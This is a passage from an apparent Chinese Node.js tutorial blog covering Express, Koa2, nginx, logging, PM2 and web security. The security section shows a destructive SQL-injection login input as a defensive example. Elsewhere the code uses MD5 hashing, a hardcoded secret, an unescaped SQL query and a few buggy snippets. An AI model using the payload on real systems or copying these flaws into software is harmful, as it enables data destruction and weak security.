const author = req.session.username req.body.author = author const blogData = req.body const dataResult = newBlog(blogData) return dataResult.then(data =&gt; &#123; return new SuccessModel(data) &#125;) &#125; // ...&#125;// router/user.jsconst &#123; setRedisVal &#125; = require('../db/redis')const handleUserRouter = (req, res) =&gt; &#123; const &#123; method, url, path &#125; = req // 登录 if(method==='POST' &amp;&amp; path==='/api/user/login') &#123; const &#123; username, password &#125; = req.body const result = loginCheck(username, password) return result.then(userData =&gt; &#123; if(userData.username) &#123; // 设置session req.session.username = userData.username setRedisVal(req.sessionId, req.session) return new SuccessModel(userData) &#125; return new ErrorModel('登录失败') &#125;) &#125;&#125; 前后端联调登录功能依赖cookie，需要userid，必须要和浏览器联调cookie跨域不共享，前后端必须同域，使用nginx 做代理，让前后端同域开发前端网页 nginx高性能web服务器，开源免费。一般用于做静态服务、负载均衡、反向代理服务器。下载:mac brew install nginx配置: /usr/local/etc/nginx/nginx.conf (Mac) ，用vi 命令打开测试配置文件是否正确: nginx -t启动: nginx -s reload停止: nginx -s stop12345678910111213141516171819202122232425262728// /usr/local/etc/nginx/nginx.confhttp &#123; server &#123; # 当访问 http://localhost:8080... 时生效 listen 8080; server_name localhost; # location / &#123; # root html; # index index.html index.htm; # &#125; # 静态文件 前端项目启动的端口 location / &#123; proxy_pass http://localhost:8000; # 使用Nginx对WebSocket进行反向代理, 表示请求服务器升级协议为WebSocket proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "Upgrade"; &#125; # server 后端项目启动的端口 location /api/ &#123; proxy_pass http://localhost:3000; proxy_set_header Host $host; &#125; &#125;&#125; 配置完成后，前端启动服务(如端口8000)，后端启动服务(端口3000)，浏览器访问 http://localhost:8080... 即可。 日志系统没有日志，就等于人没有眼睛分类: 访问日志 access log、自定义日志(自定义事件、错误记录等)nodejs文件操作，nodejs stream日志拆分、内容分析 nodejs文件操作12345678910111213141516171819202122232425262728293031323334// file-test demo// file-test/test.jsconst fs = require('fs')const path = require('path')const fileName = path.resolve(__dirname, 'data.txt') // file-test/data.txt// 读fs.readFile(fileName, (err, data) =&gt; &#123; if(err) &#123; console.error(err) return &#125; // data是二进制数据 &lt;Buffer 68 65 6c 6c 6f 20 0a 7a 7a 6c 61 70 61 0a 70 61 70 61 61 2d 2d 0a 7a 7a 7a 61&gt; console.log(data.toString())&#125;)// 写let content = 'new ...'const opt = &#123; flag: 'a', // 追加a append, 覆盖w write&#125;fs.writeFile(fileName, content, opt, (err) =&gt; &#123; if(err) &#123; console.error(err) &#125;&#125;)// 判断文件是否存在fs.exists(fileName, (exist) =&gt; &#123; console.log('exist', exist) // true&#125;) streamIO操作(网络、文件)的性能瓶颈,突出特点就是慢标准输入输出 process.stdin.pipe(process.stdout)req.pipe(res) 类比成两个水桶，连接管道1234567891011121314151617181920// file-test demo// file-test/test.jsconst fs = require('fs')const path = require('path')const fileName1 = path.resolve(__dirname, 'data.txt')const fileName2 = path.resolve(__dirname, 'data-bak.txt')const readStream = fs.createReadStream(fileName1)const writeStream = fs.createWriteStream(fileName2)readStream.pipe(writeStream)readStream.on('data', chunk =&gt; &#123; console.log(chunk.toString())&#125;)readStream.on('end', () =&gt; &#123; console.log('ok')&#125;) 写日志目录logs下，并新建 access.log、event.log、error.log 三个文件1234567891011121314151617181920212223242526272829303132333435363738394041424344// utils/log.js const fs = require('fs')const path = require('path')function createWriteStream (fileName) &#123; const fullName = getFullName(fileName) const writeStream = fs.createWriteStream(fullName, &#123; flags: 'a' &#125;) return writeStream&#125;function writeLog(writeStream, log) &#123; writeStream.write(log + '\n')&#125;// 获取完整文件路径名function getFullName(fileName) &#123; const fullName = path.join(__dirname, '../', 'logs', fileName) return fullName&#125;// 访问日志const accessWriteStream = createWriteStream('access.log')function writeAccessLog(log) &#123; writeLog(accessWriteStream, log)&#125;module.exports = &#123; writeAccessLog&#125;// index.jsconst &#123; writeAccessLog &#125; = require('./src/utils/log')const serverHandler = (req, res) =&gt; &#123; // 记录 access log writeAccessLog(`$&#123;req.method&#125;--$&#123;req.url&#125;--$&#123;req.headers['user-agent']&#125;--$&#123;Date.now()&#125;`) // ...&#125; 之后，刷新页面，即可把请求写到日志 日志拆分 crontab日志慢慢积累，放在一个文件不好处理，一般按时间拆分日志，如2019-05-13.access.log实现方式: linux的crontab命令，即定时任务crontab设置定时任务，格式: *****command 分-时-日-月-星期几流程：将access.log拷贝并重命名为2019-05-13.access.log，清空access.log文件，继续积累日志创建utils/copy.sh脚本1234#!/bin/shcd /Users/sea/Desktop/OnGoing/HelloWorld/FullStack/Node/webserver/src/logscp access.log $(date +%Y-%m-%d).access.logecho "" &gt; access.log cli 执行 sh src/utils/copy.sh 即可实现将access.log日志拆分到 2019-05-13.access.log cli 执行 crontab -e ，会打开编译器，输入1* 0 * * * sh /Users/sea/Desktop/OnGoing/HelloWorld/FullStack/Node/webserver/src/utils/copy.sh wq保存，显示crontab:installing new crontab， 则完成每天凌晨0点0分 执行日志拆分脚本crontab -l 查看当前任务列表 日志分析 readline比如针对access.log 日志，分析使用chrome的占比日志按行存储，一行就是一条日志使用nodejs的readline(基于stream，效率高)123456789101112131415161718192021222324252627282930313233// utils/readline.jsconst fs = require('fs')const path = require('path')const readline = require('readline')// 获取access.log 文件路径名const fileName = path.join(__dirname, '../', 'logs', 'access.log')// 创建 read streamconst readStream = fs.createReadStream(fileName)// 创建readline对象const rl = readline.createInterface(&#123; input: readStream&#125;)let total = 0let chromeNum = 0// 逐行读取rl.on('line', lineData =&gt; &#123; if(!lineData) return total++ let arr = lineData.split('--') if(arr[2] &amp;&amp; arr[2].includes('Chrome')) &#123; chromeNum++ &#125;&#125;)// 监听读取完成rl.on('close', () =&gt; &#123; console.log('使用chrome占比 ' + chromeNum/total)&#125;) 安全xss 攻击: 窃取前端的cookie方式: 在页面展示内容中掺杂js代码，以获取网页信息预防: 转换生成js的特殊字符12345&amp; -&gt; &amp;amp;&lt; -&gt; &amp;lt;&gt; -&gt; &amp;gt;' -&gt; &amp;#x27;" -&gt; &amp;quot; 使用xss库npm i xss –save123456789// controller/blog.jsconst xss = require('xss')const newBlog = (blogData=&#123;&#125;) =&gt; &#123; const &#123; title, content, author, createtime &#125; = blogData // 防止xss攻击 title = xss(title) // ...&#125; sql 注入: 窃取数据库内容最原始、最简单的攻击，自从web2.0就有了sql注入攻击方式:输入一个sql片段，最终拼接成一段攻击代码预防: 使用mysql的escape函数处理输入内容即可123// controller/user.js // 登录时账号密码输入如下（在mysql--表示注释）select * from users where username='zhangsan';delete from users; -- 'and password='123'; 上面代码发生sql注入。使用mysql的escape，并去掉变量的双引号1234567891011121314// db/mysql.jsmodule.exports = &#123; execSql, escape: mysql.escape&#125;// controller/user.jsconst &#123; execSql, escape &#125; = require('../db/mysql')// 加上username = escape(username)password = escape(password)// let sql = `select * from users where username='$&#123;username&#125;' and password='$&#123;password&#125;';`let sql = `select * from users where username=$&#123;username&#125; and password=$&#123;password&#125;;` // 去掉变量的双引号 密码加密: 保证用户信息安全万一数据库被攻破，最不该泄露的就是用户账号密码信息方式: 是用户账号密码，再去登录其他系统预防: 密码加密，不使用明文123456789101112131415161718192021222324252627282930313233343536// utils/crypto.jsconst crypto = require('crypto')// 密钥const SECRET_KEY = 'HELLO_Node@2019'// md5 加密function md5(content) &#123; let md5 = crypto.createHash('md5') return md5.update(content).digest('hex')&#125;// 加密函数function generatePassword(password) &#123; const str = `password=$&#123;password&#125;&amp;key=$&#123;SECRET_KEY&#125;` return md5(str)&#125;module.exports = &#123; generatePassword&#125;// 更新数据库所有用户密码为密文（其实应该在注册时就对密码加密，让注册和登录对上，此处在数据库编译器里执行只是测试加密）update users set `password`='a04db8f90de6663c06460b383ad78eae'// controller/user.js const &#123; generatePassword&#125; = require('../utils/crypto')const loginCheck = (username, password) =&gt; &#123; // 密码加密 注意要先加密再escape的顺序，不然sql的password单引号丢失，导致sql语句执行错误 password = generatePassword(password) // 使用mysql的escape函数 防止sql注入 username = escape(username) password = escape(password) let sql = `select * from users where username=$&#123;username&#125; and password=$&#123;password&#125;;` // ...&#125; 原生开发总结流程图：客户端 -&gt; nginx反向代理 -&gt; / server静态文件、/api/ … -&gt; 日志记录stream、crontab -&gt; 路由处理 -&gt; 登录校验redis -&gt; 用户信息redis -&gt; 数据处理controller -&gt; 数据存储mysql 开启服务: 启动后端服务3000端口、启动redis-server、启动nginx、启动数据库mysql、启动前端页面8000端口，打开前端页面访问http 8080端口 使用 express 重构博客项目express 是nodejs最常用的web server框架， Fast, unopinionated, minimalist web framework for node. 下载、安装express-generator 使用脚手架1234567891011121314151617npm i express-generator -g // 全局安装脚手架express blog-express // 生成项目npm i cross-env --save-dev // 安装cross-env// 配置package.json (部分)"scripts": &#123; "start": "node ./bin/www", "dev": "cross-env NODE_ENV=development nodemon ./bin/www", "prod": "cross-env NODE_ENV=production nodemon ./bin/www"&#125;,"devDependencies": &#123; "cross-env": "^5.2.0"&#125;npm i // 安装依赖npm run dev // 启动项目 开发接口初始化环境、路由安装插件 mysql、xssconfig、mysql、controller、model/resModel相关代码可以复用blog-origin原生开发代码，要保证相关资源的引入和路径修改 记得启动nginx、mysql 和 redis-server 处理session使用express-session和connect-redis，简单方便req.session保存登录信息，登录校验做成express中间件 npm i express-session –save12345678910111213// app.jsvar session = require('express-session')var &#123; SECRET_KEY &#125; = require('./utils/crypto')// session 在路由前面配置app.use(session(&#123; secret: SECRET_KEY, cookie: &#123; path: '/', httpOnly: true, maxAge: 24 * 60 * 60 * 1000 &#125;&#125;)) 使用session登录1234567891011121314151617181920212223242526272829// routes/login.jsconst express = require('express')const router = express.Router()const &#123; loginCheck &#125; = require('../controller/login')const &#123; SuccessModel, ErrorModel &#125; = require('../model/resModel')router.post('/login', (req, res, next) =&gt; &#123; // 登录 const &#123; username, password &#125; = req.body const loginResult = loginCheck(username, password) return loginResult.then(userData =&gt; &#123; if(userData.username) &#123; // 设置 session 会自动同步到redis req.session.username = userData.username // 同步到 redis 这步不需要了 // setRedisVal(req.sessionId, req.session) // return new SuccessModel(userData, '登录成功') // 改成, 失败下同 res.json(new SuccessModel(userData, '登录成功')) return &#125; res.json(new ErrorModel('登录失败')) &#125;)&#125;)module.exports = router 其中，setRedisVal 不再需要, 设置 session时 会自动同步到redis。返回结果改成res.json() 在return的方式。之后，使用postman，参数输入账号密码可测试登录接口， 如zhangsan, 123 返回登录成功。 或者，启动nginx 通过前端服务访问。 连接redis, session存入redisnpm i redis connect-redis –save1234567891011121314151617181920212223242526272829303132// db/redis.js 创建redisClientconst redis = require('redis')const &#123; REDIS_CONF &#125; = require('../config/db')// 创建redis客户端const redisClient = redis.createClient(REDIS_CONF.port, REDIS_CONF.host)// 监听errorredisClient.on('error', err =&gt; &#123; console.error(err)&#125;)module.exports = redisClient// app.jsvar redisClient = require('./db/redis')var redisStore = require('connect-redis')(session)// sessionconst sessionStore = new redisStore(&#123; client: redisClient&#125;)app.use(session(&#123; secret: SECRET_KEY, cookie: &#123; path: '/', httpOnly: true, maxAge: 24 * 60 * 60 * 1000 &#125;, store: sessionStore // 存入store&#125;)) 这步要启动redis-server 查看redis: 启动redis-cli -&gt; 先清空flushdb -&gt; keys * 返回为空 -&gt; “sess:W..y “ -&gt; get sess:W..y 没有username-&gt;启动前端8081 -&gt; nginx代理 8080登录 -&gt; get sess:W..y 有username 登录中间件新建middleware/loginCheckSession.js 文件, loginCheckResult中间件，判定session中是否有username。 之后，在需要登录校验的接口调用中间件。1234567891011121314151617181920212223242526272829303132// middleware/loginCheckSession loginCheckResult中间件const &#123; ErrorModel &#125; = require('../model/resModel')const loginCheckSession = (req, res, next) =&gt; &#123; if(req.session.username) &#123; next() return &#125; res.json(new ErrorModel('未登录'))&#125;module.exports = loginCheckSession// routes/blog.js 调用const loginCheckSession = require('../middleware/loginCheckSession')router.get('/list', loginCheckSession, (req, res, next) =&gt; &#123; let author = req.query.author const keyword = req.query.keyword // 管理员界面 if(req.query.isadmin) &#123; if(req.session.username==null) &#123; res.json(new ErrorModel('未登录')) return &#125; // 强制只查询登陆用户自己的博客 author = req.session.username &#125; // ...&#125;) 开发路由，获取博客详情等与以上登录类似，以获取博客详情为例, 更新、删除等类似123456789// routes/blog.js// 获取博客详情router.get('/detail', (req, res, next) =&gt; &#123; const id = req.query.id let detailResult = getDetail(id) return detailResult.then(detailData =&gt; &#123; res.json(new SuccessModel(detailData)) &#125;)&#125;) 记录日志access log记录日志，直接使用脚手架推荐的morgan12345678910111213141516171819202122// app.jsvar path = require('path')var fs = require('fs')var logger = require('morgan')var ENV = process.env.NODE_ENVif(ENV !=='production') &#123; // 开发、测试环境 app.use(logger('dev', &#123; stream: process.stdout // 打印到控制台 可省略 &#125;))&#125; else &#123; // 线上环境 const fileName = path.join(__dirname, 'logs', 'access.log') const writeStream = fs.createWriteStream(fileName, &#123; flags: 'a' &#125;) app.use(logger('combined', &#123; stream: writeStream &#125;))&#125; express 中间件原理app.use() 注册中间件，先收集起来遇到http请求，根据method和path判断触发哪些实现next机制，即上一个通过next触发下一个 express实现原理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899// lib/like-express.js const http = require('http')const slice = Array.prototype.sliceclass LikeExpress &#123; constructor() &#123; // 存放中间件列表 this.routes = &#123; all: [], get: [], post: [] &#125; &#125; register(path) &#123; const info = &#123;&#125; if(typeof path === 'string') &#123; info.path = path // 从第二个参数开始，转换为数组，存入stack info.stack = slice.call(arguments, 1) &#125; else &#123; info.path = '/' // 从第一个参数开始，转换为数组，存入stack info.stack = slice.call(arguments, 0) &#125; return info &#125; use() &#123; const info = this.register.apply(this, arguments) this.routes.all.push(info) &#125; get() &#123; const info = this.register.apply(this, arguments) this.routes.get.push(info) &#125; post() &#123; const info = this.register.apply(this, arguments) this.routes.post.push(info) &#125; match(method, url) &#123; let stack = [] if(url==='/favicon.ico') &#123; return stack &#125; // 获取routes let curRoutes = [] curRoutes = curRoutes.concat(this.routes.all, this.routes[method]) curRoutes.forEach(routeInfo =&gt; &#123; if(url.indexOf(routeInfo.path) === 0) &#123; // url==='/api/test' 且 routeInfo.path为 '/'、'/api' 或 '/api/test' stack = stack.concat(routeInfo.stack) &#125; &#125;) return stack &#125; // next 机制 handle(req, res, stack) &#123; // 定义next，并立即执行 const next = () =&gt; &#123; // 拿到第一个匹配的中间件 const middleware = stack.shift() if(middleware) &#123; // 执行中间件函数 middleware(req, res, next) &#125; &#125; next() &#125; callback() &#123; return (req, res) =&gt; &#123; res.json = (data) =&gt; &#123; res.setHeader('Content-Type', 'application/json') res.end(JSON.stringify(data)) &#125; const url = req.url const method = req.method.toLowerCase() // 这里必须 toLowerCase() 统一成小写 const resultList = this.match(method, url) this.handle(req, res, resultList) &#125; &#125; listen(...args) &#123; const server = http.createServer(this.callback()) server.listen(...args) &#125;&#125;// 工场函数module.exports = () =&gt; &#123; return new LikeExpress()&#125; 测试代码, 测试自己实现的express 是否生效12345678910111213141516171819202122232425262728293031323334353637383940414243444546// lib/express/test-expressconst express = require('./like-express')const app = express()app.use((req, res, next) =&gt; &#123; console.log('开始') next()&#125;)app.use((req, res, next) =&gt; &#123; console.log('cookie') req.cookie = &#123; userId: 'abc' &#125; next()&#125;)app.use('/api', (req, res, next) =&gt; &#123; console.log('use api') next()&#125;)app.get('/api', (req, res, next) =&gt; &#123; console.log('get api') next()&#125;)loginCheck = (req, res, next) =&gt; &#123; setTimeout(() =&gt; &#123; console.log('loginCheck') next() &#125;, 1000);&#125;app.get('/api/test', loginCheck, (req, res, next) =&gt; &#123; console.log('get api test') res.json(&#123; errorno: 0, data: req.cookie &#125;)&#125;)app.listen(3001, () =&gt; &#123; console.log('listening at http://localhost:3001')&#125;) 运行 node lib/express/test-express 访问页面，查看控制台输出 小结使用express框架与原生开发区别:写法上发生改变，如req.query、req.json，可直接获取写入，不需要自己写入；存储session到redis 使用 express-session、connect-redis，登录中间件;记录日志，使用morganexpress原理 使用 Koa2 重构博客项目express 中间件是异步回调，koa2原生支持async/await新开发框架都开始基于koa，例如egg.jsexpress 虽然未过时，但koa2肯定是未来趋势注: node版本大于等于8.0 async/await 异步函数介绍异步方式对比在/test/files下有a.json、b.json、c.json三个文件，分别用callback、promise 和 async/await三种方式实现异步获取 callback-hell 12345678910111213141516171819202122232425262728293031// /test/index.jsconst fs = require('fs')const path = require('path')// callbackfunction getFileContentByCb(fileName, cb) &#123; const fullFileName = path.resolve(__dirname, 'files', fileName) fs.readFile(fullFileName, (err, data) =&gt; &#123; if(err) &#123; console.error(err) return &#125; cb(JSON.parse(data.toString())) &#125;)&#125;// test callback-hellgetFileContentByCb('a.json', aData =&gt; &#123; console.log('a data', aData) getFileContentByCb(aData.next, bData =&gt; &#123; console.log('b data', bData) getFileContentByCb(bData.next, cData =&gt; &#123; console.log('c data', cData) &#125;) &#125;) &#125;)// 打印结果// a data &#123; msg: 'this is a', next: 'b.json' &#125;// b data &#123; msg: 'this is b', next: 'c.json' &#125;// c data &#123; msg: 'this is c', next: null &#125; promise 123456789101112131415161718192021222324252627// /test/index.jsfunction getFileContentByPromise(fileName) &#123; const fullFileName = path.resolve(__dirname, 'files', fileName) return new Promise((resolve, reject) =&gt; &#123; fs.readFile(fullFileName, (err, data) =&gt; &#123; if(err) &#123; reject(err) return &#125; resolve(JSON.parse(data.toString())) &#125;) &#125;)&#125;// promise().then()getFileContentByPromise('a.json') .then(aData =&gt; &#123; console.log('a data', aData) return getFileContentByPromise(aData.next) &#125;) .then(bData =&gt; &#123; console.log('b data', bData) return getFileContentByPromise(bData.next) &#125;) .then(cData =&gt; &#123; console.log('c data', cData) &#125;) async/await 变成同步的写法要点:await包裹在async函数里面；await后可追加promise对象；async函数执行返回的也是一个promise对象；promise中resolve内容可以被await解析返回到前面的变量中；try…catch 截获promise中reject的值 123456789101112131415// /test/index.js async function readFileData() &#123; try &#123; const aData = await getFileContentByPromise('a.json') // 其中，getFileContentByPromise和promise一样。 console.log('a data', aData) const bData = await getFileContentByPromise(aData.next) console.log('b data', bData) const cData = await getFileContentByPromise(bData.next) console.log('c data', cData) &#125; catch(e) &#123; console.error(e) &#125;&#125;readFileData() koa介绍、安装、使用Expressive middleware for node.js using ES2017 async functions1234567891011121314npm i koa-generator -g // 安装脚手架Koa2 blog-koa // 生成blog-koa 的项目npm i cross-env --save-dev // 安装 cross-env// package.json 修改配置"scripts": &#123; "start": "node bin/www", "dev": "cross-env NODE_ENV=dev ./node_modules/.bin/nodemon bin/www", "prd": "cross-env NODE_ENV=production pm2 start bin/www",&#125;,npm i &amp;&amp; npm run dev // 安装依赖、启动项目// http://localhost:3000/ // 打开浏览器访问默认3000端口 koa 路由需要特别注意的是，之前的req.body 都需要改为 ctx.request.body 请求体，以区分ctx.body 返回体123456789101112131415161718192021// app.jsconst login = require('./routes/login')// routesapp.use(login.routes(), login.allowedMethods())// routes/login.jsconst router = require('koa-router')()router.prefix('/login')router.post('/login', async (ctx, next) =&gt; &#123; const &#123; username, password &#125; = ctx.request.body ctx.body = &#123; code: 2000, username, password, &#125;&#125;)module.exports = router koa 中间件app.use()注册中间件，使用async/await; next() 也是一个promise1234567// app.js 以 logger 中间件为例app.use(async (ctx, next) =&gt; &#123; const start = new Date() await next() const ms = new Date() - start console.log(`$&#123;ctx.method&#125; $&#123;ctx.url&#125; - $&#123;ms&#125;ms`)&#125;) 实现登录 redis存储session实现登录的session， 和express类似，基于koa-generic-session 和 koa-redisnpm i koa-generic-session redis koa-redis –save12345678910111213141516171819202122232425262728293031323334// app.js 配置session、redisconst session = require('koa-generic-session')const redisStore = require('koa-redis')const &#123; REDIS_CONF &#125; = require('./config/db')// session 在logger和routes之间 app.keys = ['HELLO_Node@2019']app.use(session(&#123; // cookie cookie: &#123; path: '/', httpOnly: true, maxAge: 24 * 60 * 60 * 1000 &#125;, // redis store: redisStore(&#123; // all: '127.0.0.1:6379' // 写死 all: `$&#123;REDIS_CONF.host&#125;:$&#123;REDIS_CONF.port&#125;` // 配置store中all为 REDIS_CONF 配置的参数 &#125;)&#125;))// routes/login.js 测试router.get('/test', async(ctx, next) =&gt; &#123; if(ctx.session.viewNum==null) &#123; ctx.session.viewNum = 0 &#125; ctx.session.viewNum++ ctx.body = &#123; code: 2000, viewNum: ctx.session.viewNum &#125;&#125;) 启动redis-server， 浏览器访问 http://localhost:3000/login/test 测试; 或者 redis-cli -&gt; keys* -&gt; get … 方式来测试 开发路由准备工作npm i mysql xss –save 安装 mysql、xss 依赖 复用blog-express之前代码，如登录中间件 config、db/mysql.js、controller、utils、middleware、model 等文件夹或文件 到blog-koa项目，对其中一些文件进行修改，中间件要符合koa中间件形式 修改controller 为 async/await 函数。 此处举getDetail、newBlog两个例子，可对比promise 和 async/await 的用法区别，写法清晰很多1234567891011121314151617181920212223242526272829303132// controller/blog.js 以getDetail函数为例const getDetail = (id) =&gt; &#123; let sql = `select * from blogs where id='$&#123;id&#125;';` return execSql(sql).then(arr =&gt; &#123; return arr[0] &#125;)&#125;// 修改为const getDetail = async (id) =&gt; &#123; let sql = `select * from blogs where id='$&#123;id&#125;';` const rows = await execSql(sql) return rows[0]&#125;// controller/blog.js 再以newBlog函数为例const newBlog = async (blogData=&#123;&#125;) =&gt; &#123; // ... return execSql(sql).then(insertData =&gt; &#123; return &#123; id: insertData.insertId &#125; &#125;)&#125;// 修改为const newBlog = async (blogData=&#123;&#125;) =&gt; &#123; // ... const insertData = await execSql(sql) return &#123; id: insertData.insertId &#125;&#125; 修改 middleware/loginCheckSession.js 改promise方式为koa方式。 这个是比较标准的koa中间件。12345678910111213141516171819202122232425// middleware/loginCheckSession.js const &#123; ErrorModel &#125; = require('../model/resModel')const loginCheckSession = (req, res, next) =&gt; &#123; if(req.session.username) &#123; next() return &#125; res.json(new ErrorModel('未登录'))&#125;module.exports = loginCheckSession// 修改为const &#123; ErrorModel &#125; = require('../model/resModel')const loginCheckSession = async (rctx, next) =&gt; &#123; if(ctx.session.username) &#123; await next() return &#125; ctx.body = new ErrorModel('未登录')&#125;module.exports = loginCheckSession 初始化路由，开发接口开发routes/login.js和routes/blog.js路由，这步也可以复用之前blog-express中routes下的代码，对其进行改造koa的async/await形式。以routes/blog.js 中获取博客详情为例，123456789101112131415161718192021// routes/blog.js// controller 这几行可直接复用const &#123; getList, getDetail, newBlog, updateBlog, delBlog &#125; = require('../controller/blog')// modelconst &#123; SuccessModel, ErrorModel &#125; = require('../model/resModel')const loginCheckSession = require('../middleware/loginCheckSession')// 以下需改造router.get('/detail', (req, res, next) =&gt; &#123; const id = req.query.id let detailResult = getDetail(id) return detailResult.then(detailData =&gt; &#123; res.json(new SuccessModel(detailData)) &#125;)&#125;)// 替换为router.get('/detail', async (ctx, next) =&gt; &#123; const id = ctx.query.id const detailData = await getDetail(id) ctx.body = new SuccessModel(detailData)&#125;) 联调测试，连接数据库，启动nginx、前端项目前端页面访问请求，或者使用postman模拟 日志记录、拆分与分析access log 记录，使用morgan, 新建logs/access.log文件koa框架中koa-logger仅仅使得日志打印格式化，并未真正记录日志，需借助koa-morgan, 因morgan只适用于express自定义日志暂时使用console.log/error npm i koa-morgan –save 安装依赖 koa-morgan1234567891011121314151617181920// app.jsconst path = require('path')const fs = require('fs')const morgan = require('koa-morgan')// logs 可写在logger之后。类似于express,但需app.use(logger('dev'))改为app.use(morgan('dev')),因logger已被占用const ENV = process.env.NODE_ENVif(ENV !=='production') &#123; // 开发、测试环境 app.use(morgan('dev'));&#125; else &#123; // 线上环境 const fileName = path.join(__dirname, 'logs', 'access.log') const writeStream = fs.createWriteStream(fileName, &#123; flags: 'a' &#125;) app.use(morgan('combined', &#123; stream: writeStream &#125;));&#125; koa2中间件原理koa2官方实例洋葱圈模型: request -&gt; onion-1 start -&gt; onion-2 start -&gt; onion-2 end -&gt; onion-1 end -&gt; response12345678910111213141516171819202122232425262728293031323334353637// blog-koa/lib/test-koa.js nodemon test-koa.js 启动const Koa = require('koa');const app = new Koa();// loggerapp.use(async (ctx, next) =&gt; &#123; console.log('onion-1 ', 'start') await next(); const rt = ctx.response.get('X-Response-Time'); console.log(`$&#123;ctx.method&#125; $&#123;ctx.url&#125; - $&#123;rt&#125;`); console.log('onion-1 ', 'end')&#125;);// x-response-timeapp.use(async (ctx, next) =&gt; &#123; console.log('onion-2 ', 'start') const start = Date.now(); await next(); const ms = Date.now() - start; ctx.set('X-Response-Time', `$&#123;ms&#125;ms`); console.log('onion-2 ', 'end')&#125;);// responseapp.use(async ctx =&gt; &#123; console.log('onion-3 ', 'start') ctx.body = 'Hello World'; console.log('onion-3 ', 'end')&#125;);app.listen(3000); 原理分析app.use 注册中间件，先收集起来实现next机制，即上一个通过next触发下一个不涉及method和path判断 核心代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// lib/like-koa.jsconst http = require('http')// 组合中间件function compose(middlewareList) &#123; return function(ctx) &#123; // 中间件调用 function dispatch(i) &#123; const fn = middlewareList[i] // 兼容未使用async，保证返回的中间件都是promise try &#123; return Promise.resolve( fn(ctx, dispatch.bind(null, i+1)) // next机制 ) &#125; catch (e) &#123; Promise.reject(e) &#125; &#125; return dispatch(0) &#125;&#125;class LikeKoa &#123; constructor() &#123; this.middlewareList = [] &#125; use(fn) &#123; this.middlewareList.push(fn) return this // 链式调用 &#125; listen(...args) &#123; const server = http.createServer(this.callback()) server.listen(...args) &#125; callback() &#123; const fn = compose(this.middlewareList) return (req, res) =&gt; &#123; const ctx = this.createContext(req, res) return this.handleRequest(ctx, fn) &#125; &#125; // 拼接ctx createContext(req, res) &#123; const ctx = &#123; req, res &#125; ctx.query = req.query return ctx &#125; handleRequest(ctx, fn) &#123; return fn(ctx) &#125;&#125;module.exports = LikeKoa 测试代码仿照官网示例demo实现的lib/test-koa.js，修改koa引用like-koa，ctx涉及method、url、body、set、get等处12345678910111213141516171819202122232425262728293031// lib/test-like-koa.jsconst Koa = require('./like-koa'); // 替换node_modules/koaconst app = new Koa();// loggerapp.use(async (ctx, next) =&gt; &#123; console.log('onion-1 ', 'start') await next(); const rt = ctx['X-Response-Time']; // 替换ctx.get console.log(`$&#123;ctx.req.method&#125; $&#123;ctx.req.url&#125; - $&#123;rt&#125;`); // 替换ctx.method/url console.log('onion-1 ', 'end')&#125;);// x-response-timeapp.use(async (ctx, next) =&gt; &#123; console.log('onion-2 ', 'start') const start = Date.now(); await next(); const ms = Date.now() - start; ctx['X-Response-Time'] = `$&#123;ms&#125;ms`; // 替换ctx.set console.log('onion-2 ', 'end')&#125;);// responseapp.use(async ctx =&gt; &#123; console.log('onion-3 ', 'start') ctx.res.end('Hello from like-koa!'); // 替换ctx.body console.log('onion-3 ', 'end')&#125;);app.listen(3000); 上线与配置服务器稳定性、充分利用服务器资源，以便提高性能、线上日志记录 PM2Node.js Production Process Manager with a built-in Load Balancer.pm2核心价值: 进程守护，系统崩溃自动重启； 启动多进程，充分利用CPU和内存；自带日志记录功能 下载、安装npm i pm2 -g 如果失败，可指定版本，如pm2@3.2.3pm2 –version 查看版本 123456// package.json pm启动production环境"scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "dev": "cross-env NODE_ENV=dev nodemon app.js", "prd": "cross-env NODE_ENV=production pm2 start ./bin/www"&#125;, 运行命令npm run prd 常用命令pm2 start … 启动pm2 list 进程列表pm2 start App name/id 重启pm2 stop App name/id 停止pm2 delete App name/id 删除pm2 info App name/id 查看信息pm2 log App name/id 查看日志pm2 monit App name/id 监控CPU/内存 进程守护使用node app.js 或 nodemon app.js，进程崩溃则不能访问，使用pm2 系统崩溃可自动重启 如下，123456789101112131415161718192021// test/pm2/app.jsconst http = require('http')const server = http.createServer((req, res) =&gt; &#123; // 模拟错误 if(req.url === '/err') &#123; throw new Error('ooops !') &#125; res.setHeader("Content-Type", "application/json") res.end( JSON.stringify(&#123; code: 2000, data: [2, 3, 5] &#125;) )&#125;)server.listen(3000, () =&gt; &#123; console.log('listening at port 3000')&#125;) npm run dev, 以node或 nodemon启动项目，则直接崩溃，不会回复。npm run prd 启动项目，当访问 http://localhost:3000/err，进程崩溃，但当访问http://localhost:3000 时，仍然可以访问，pm2 list 中restart此时增加了。 配置新建pm2 配置文件 test/pm2/pm2.conf.json，包括进程数量，日志文件目录等配置信息123456789101112131415161718192021222324// test/pm2/pm2.conf.json&#123; "apps": &#123; "name": "pm2-test", "script": "app.js", "watch": true, "ignore_watch": [ "node_modules", "logs" ], "instances": 4, // 多进程 "out_file": "logs/out.log", "error_file": "logs/err.log", "log_date_format": "YYYY-MM-DD HH:mm:ss" &#125;&#125;// package.json"scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "dev": "cross-env NODE_ENV=dev nodemon app.js", // "prd": "cross-env NODE_ENV=production pm2 start app.js" "prd": "cross-env NODE_ENV=production pm2 start pm2.conf.json"&#125; 多进程原因: 单个进程内存受限，操作系统会限制一个进程的最大可用内存，如nodejs在64位操作系统，最大可占用1.4GB。缺陷: 因此只有一个进程，则无法充分利用多核CPU优势和机器全部内存问题: 但多进程内存无法共享，可以通过redis实现数据共享实现: 如上， pm2.conf.json配置文件中增加 “instances”: 4, 即可实现多进程 服务器运维服务器运维，一般由专业的OP人员或团队来处理，中小型工期推荐使用云服务，如阿里云的node平台 总结]]></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>Node</tag>
        <tag>FullStack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React 共享单车开发实战总结]]></title>
